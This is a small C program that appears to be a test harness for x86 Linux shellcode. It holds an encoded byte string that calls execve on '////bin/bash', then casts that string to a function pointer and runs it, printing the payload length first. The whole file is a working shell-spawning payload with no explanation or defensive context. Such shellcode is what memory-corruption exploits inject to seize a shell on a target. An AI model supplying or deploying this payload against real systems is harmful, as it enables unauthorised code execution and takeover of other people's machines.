#include<stdio.h>
#include<string.h>

unsigned char code[] = 
"\x31\xdb\x31\xc9\x53\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xda\x89\xe3\x51\x89\xe1\x31\xc0\xb0\x0b\xcd\x80";

int main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();
}



